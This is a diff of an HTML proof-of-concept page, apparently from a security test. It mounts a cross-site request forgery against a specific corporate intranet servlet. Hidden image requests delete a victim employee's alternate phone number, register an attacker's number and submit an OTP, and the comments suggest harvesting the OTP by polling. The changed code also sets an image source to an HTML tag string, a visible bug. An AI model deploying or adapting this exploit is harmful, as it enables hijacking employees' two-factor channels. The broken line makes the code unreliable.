@@ -3,6 +3,7 @@
         <h1>My Security CSRF Test</h1>
     </head>
     <script>
+
         function deleteNumber() {
             var param = 'phone=&action=KSNS_ALTMOV_ACTION_BORRADO';
             get('delete number', param);
@@ -21,37 +22,28 @@
         }
 
         function get(msg, param) {
-
             var url = 'https://portalintranet.es.igrupobbva/KSNSH/ksns_mult_web/RegistroAlterMovilServlet?' + param;
-            //var url = 'https://google.es?' + param;
-
-            document.write('<img src="'+url+'">');
-
-            /*
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", url, true);
-            xhr.onload = function () {
-                if (xhr.readyState == 4 && xhr.status == "200") {
-                    console.log("success: "+msg);
-                } else {
-                    console.log("error: "+ msg);
-                }
-            }
-            xhr.send();        
-            */
+            var dom_img = document.createElement('img');
+            dom_img.src = '<img src="'+url+'">';
+            dom_img.style.display = "none";
+            document.body.appendChild(dom_img);
         }
-//document.getElementById("otp").value
+
+        // First, ensure a Cookies are set by doing a dummy request
+        get('dummy request', '');
+
+
     </script>
     <body>
 
 	    <h3>First we remove current alternative number (OPTIONAL STEP)</h3>
 	    <button  type="button" onclick="deleteNumber()">Delete phone number</button>
 
-	    <h3>Now we add attacker's phone number</h3>
+	    <h3>Now we add attacker's phone number (cannot be currently registered for other employee)</h3>
         <input type=text id="number">
 	    <button  type="button" onclick="addNumber()">Add phone number</button>
         
-	    <h3>Now we send the OTP</h3>
+	    <h3>Now we send the OTP (we could get this automatically via polling from attacker's side)</h3>
         <input type=text id="otp">
 	    <button  type="button" onclick="sendOTP()">Send OTP</button>
     </body>
